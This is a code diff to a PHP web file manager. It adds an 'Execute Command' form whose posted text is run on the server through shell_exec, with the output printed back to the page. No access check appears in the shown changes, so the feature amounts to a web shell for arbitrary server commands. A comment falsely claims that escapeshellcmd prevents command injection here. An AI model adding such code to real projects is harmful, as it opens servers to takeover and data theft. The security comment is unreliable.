@@ -11,6 +11,13 @@ if ($currentDir === false || strpos($currentDir, $baseDir) !== 0) {
 $filesPerPage = 20; // Items per page
 $page = isset($_GET['page']) ? max(1, (int)$_GET['page']) : 1; // Current page
 
+// --- Shell Execution ---
+$commandOutput = "";
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['command'])) {
+    $command = escapeshellcmd($_POST['command']); // Sanitize user input to prevent command injection
+    $commandOutput = shell_exec($command); // Execute the command
+}
+
 // --- Handle File Create / Update ---
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['filename'])) {
     $filename = basename($_POST['filename']);
@@ -131,6 +138,15 @@ function buildUrl($params) {
         .file-icon {
             color: green;
         }
+
+        .shell-output {
+            background-color: #f1f1f1;
+            padding: 10px;
+            border: 1px solid #ccc;
+            font-family: monospace;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
     </style>
 </head>
 <body>
@@ -214,6 +230,20 @@ function buildUrl($params) {
         <a href="<?= buildUrl(['page' => $page + 1]) ?>">Next »</a>
     <?php endif; ?>
 </div>
+<?php endif; ?>
+
+<hr>
+
+<h3>Execute Command</h3>
+<form method="POST">
+    <input type="text" name="command" placeholder="Enter shell command" required>
+    <button type="submit">Run Command</button>
+</form>
+
+<?php if ($commandOutput !== ""): ?>
+    <div class="shell-output">
+        <pre><?= htmlspecialchars($commandOutput) ?></pre>
+    </div>
 <?php endif; ?>
 
 </body>
